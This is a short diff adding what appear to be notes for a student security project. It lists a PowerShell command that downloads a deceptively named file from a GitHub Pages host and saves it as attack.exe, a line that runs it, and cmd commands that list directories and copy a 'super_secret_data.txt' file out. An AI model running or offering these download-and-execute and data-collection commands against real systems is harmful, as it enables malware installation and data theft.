@@ -1,0 +1,13 @@
+Download file:
+powershell -command "Invoke-WebRequest -Uri 'https://kajtekkups.github.io/Security_project/completly_safe_file.xd' -OutFile 'attack.exe'"
+
+Run it & close cmd:
+./attack.exe & exit
+
+Server:
+cmd.exe /c dir /b > text.txt   
+cmd.exe /c cd ./TEST_DIR & dir /b > ../text.txt
+cmd.exe /c cd ./TEST_DIR & type super_secret_data.txt > ../text.txt  
+
+
+
